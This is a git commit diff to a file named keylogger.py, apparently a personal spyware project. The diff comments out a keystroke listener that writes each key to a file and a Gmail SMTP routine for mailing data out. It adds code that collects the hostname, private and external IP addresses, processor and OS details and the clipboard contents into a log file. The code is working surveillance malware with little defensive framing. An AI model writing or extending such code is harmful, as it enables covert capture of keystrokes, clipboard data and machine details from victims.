4a521ef06059f530728385751a4bb930855a9874
Prajwal <prajwalslocker15@gmail.com>
2024-09-05 14:46:35 +0530

    Added functionality to fetch machine information

--- keylogger.py
+++ keylogger.py
@@ -40,34 +40,63 @@ clipboard_information_enc = 'enc_clipboard.txt'
 keys_information_enc = 'enc_keys_logged.txt'
 
 # Keyboard Logging
-'''
-def on_press_func(key):
-    try:
-        if(key == Key.shift_r):
-            listener.stop()
-        else:
-            f.write(key.char)
-    except AttributeError:
-        f.write('(' + str(key) + ')')
+
+# def on_press_func(key):
+#     try:
+#         if(key == Key.shift_r):
+#             listener.stop()
+#         else:
+#             f.write(key.char)
+#     except AttributeError:
+#         f.write('(' + str(key) + ')')
 
 
-f = open(keys_information, 'a')
+# f = open(keys_information, 'a')
 
-with Listener(
-        on_press=on_press_func) as listener:
-    listener.join()
+# with Listener(
+#         on_press=on_press_func) as listener:
+#     listener.join()
 
-f.close()
-'''
+# f.close()
+
 # Email
 
-sender_email = os.environ['SENDER_EMAIL']
-sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
-receiver_email = os.environ['RECEIVER_EMAIL']
+# sender_email = os.environ['SENDER_EMAIL']
+# sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
+# receiver_email = os.environ['RECEIVER_EMAIL']
 
-smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
-smtp_session.starttls()
-smtp_session.login(sender_email, sender_emails_pwd)
-message = "Testing3 to see if I can send emails through Python"
-smtp_session.sendmail(sender_email, receiver_email, message)
-smtp_session.quit()
+# smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
+# smtp_session.starttls()
+# smtp_session.login(sender_email, sender_emails_pwd)
+# message = "Testing3 to see if I can send emails through Python"
+# smtp_session.sendmail(sender_email, receiver_email, message)
+# smtp_session.quit()
+
+# Computer Information
+
+hostname = socket.gethostname()
+internal_IP = socket.gethostbyname(hostname) # Usually returns loopback address
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+s.connect(("8.8.8.8", 80))
+private_IP = s.getsockname()[0] # Will return the private IP of the machine
+
+external_IP = get('https://api.ipify.org').text
+
+processor_info = platform.processor()
+system_info, system_ver = platform.system(), platform.version()
+machine_info = platform.machine()
+
+f = open(system_information, 'a')
+
+f.write('Hostname: ' + hostname + '\n' +
+        'Internal IP: ' + internal_IP + '\n' +
+        'Private IP: ' + private_IP + '\n' +
+        'External IP: ' + external_IP + '\n' +
+        'Processor Info: ' + processor_info + '\n' +
+        'System Info: ' + system_info + '\n' + 
+        'System Version: ' + system_ver + '\n' +
+        'Machine Info: ' + machine_info + '\n' +
+        'Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
+
+f.close()
